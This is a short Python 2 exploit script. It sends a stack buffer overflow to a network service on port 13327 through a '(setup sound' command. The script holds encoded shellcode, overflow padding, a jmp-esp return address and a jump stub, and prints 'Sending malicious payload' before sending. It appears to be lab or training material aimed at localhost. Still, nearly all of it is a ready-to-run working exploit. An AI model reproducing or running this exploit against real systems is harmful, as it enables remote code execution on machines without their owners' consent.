#!/usr/bin/python

import socket
#jmp ESP 0x08134597

payload = ("\xba\xd6\x7c\x4b\xc4\xda\xd6\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
"\x14\x83\xc3\x04\x31\x53\x10\x03\x53\x10\x34\x89\x7a\x1f\x4f"
"\x91\x2e\xdc\xfc\x3c\xd3\x6b\xe3\x71\xb5\xa6\x63\x2a\x64\x6b"
"\x0b\xcf\x98\x9a\x97\xa5\x88\xcd\x77\xb3\x48\x87\x11\x9b\x47"
"\xd8\x54\x5a\x5c\x6a\x62\xed\x3a\x41\xea\x4e\x73\x3f\x27\xd0"
"\xe0\x99\xdd\xee\x5e\xd7\xa1\x58\x26\x1f\xc9\x75\xf7\xac\x61"
"\xe2\x28\x31\x18\x9c\xbf\x56\x8a\x33\x49\x79\x9a\xbf\x84\xfa")

pattern = ""

#buff = "\x11(setup sound " + "A"*(4368) + "B"*(4) + "C"*7 + "\x90\x00#"

#buff = "\x11(setup sound " + "A"*(4368) + "\x97\x45\x13\x08" + "\x83\xC0\x0C\xFF\xE0"+ "\x90\x90\x90\x00#"

esp = "\x97\x45\x13\x08"
eip = "\x83\xC0\x0C\xFF\xE0"
nop = "\x90\x90"
term = "\x90\x00#"

exploit ="\x11(setup sound " + payload + "A" * (4368 - 105) + esp + eip + nop + term

buff = "\x11(setup sound " + payload + "A"*(4368-105) + "\x97\x45\x13\x08" + "\x83\xC0\x0C\xFF\xE0"+ "\x90\x90\x90\x00#"
print "Connecting...."
try:
   s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   connect=s.connect(('127.0.0.1',13327))
except KeyboardInterrupt:
   s.close()
   exit()
except Exception as e:
   print(e)
   exit()


try:
   print(s.recv(1024) + '\n')
   print "Sending malicious payload...."
   s.send(exploit)
except KeyboardInterrupt:
   s.close()
   exit()
except Exception as e:
   print(e)
   s.close()
   exit()
